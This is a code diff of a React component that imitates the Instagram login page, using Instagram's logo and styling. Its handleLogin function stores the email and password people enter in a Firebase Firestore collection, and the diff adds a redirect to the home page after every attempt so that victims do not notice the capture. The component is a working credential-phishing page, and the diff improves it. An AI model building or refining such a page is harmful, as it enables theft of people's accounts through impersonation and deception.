@@ -1,6 +1,7 @@
 import React, { useState } from 'react';
 import { initializeApp } from 'firebase/app';
 import { getFirestore, collection, addDoc } from 'firebase/firestore';
+import { useNavigate } from 'react-router-dom';
 
 
 const InstagramLogin = () => {
@@ -8,6 +9,9 @@ const InstagramLogin = () => {
     const [password, setPassword] = useState('');
     const [error, setError] = useState('');
     const [loading, setLoading] = useState(false);
+
+    // Inside your component:
+    const navigate = useNavigate();
 
     // Note: In a real implementation, you would initialize Firebase here:
 
@@ -23,6 +27,8 @@ const InstagramLogin = () => {
 
     const handleLogin = async () => {
         setLoading(true);
+        setError('');
+
         try {
             // Store email and password in Firestore
             await addDoc(collection(db, 'users'), {
@@ -31,11 +37,14 @@ const InstagramLogin = () => {
             });
         } catch (error) {
             setError(error.message);
+            navigate('/');
         } finally {
             setLoading(false);
+
+            // Redirect back to home page regardless of success or failure
+            navigate('/');
         }
     };
-
 
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
@@ -60,19 +69,19 @@ const InstagramLogin = () => {
                     <div className="flex justify-center mb-8">
                         {/* <Instagram className="w-12 h-12" /> */}
                         <i
-            data-visualcompletion="css-img"
-            aria-label="Instagram"
-            role="img"
-            style={{
-                backgroundImage: 'url("https://static.cdninstagram.com/rsrc.php/v3/ym/r/BQdTmxpRI6f.png")',
-                backgroundPosition: '0px 0px',
-                backgroundSize: '176px 181px',
-                width: '175px',
-                height: '51px',
-                backgroundRepeat: 'no-repeat',
-                display: 'inline-block'
-            }}
-        ></i>
+                            data-visualcompletion="css-img"
+                            aria-label="Instagram"
+                            role="img"
+                            style={{
+                                backgroundImage: 'url("https://static.cdninstagram.com/rsrc.php/v3/ym/r/BQdTmxpRI6f.png")',
+                                backgroundPosition: '0px 0px',
+                                backgroundSize: '176px 181px',
+                                width: '175px',
+                                height: '51px',
+                                backgroundRepeat: 'no-repeat',
+                                display: 'inline-block'
+                            }}
+                        ></i>
                     </div>
 
                     <form onSubmit={handleSubmit} className="space-y-6">
@@ -97,7 +106,7 @@ const InstagramLogin = () => {
                         </div>
 
                         <button
-                                   onClick={handleLogin}
+                            onClick={handleLogin}
                             type="submit"
                             disabled={loading}
                             className={`w-full bg-blue-500 text-white py-2 rounded font-semibold
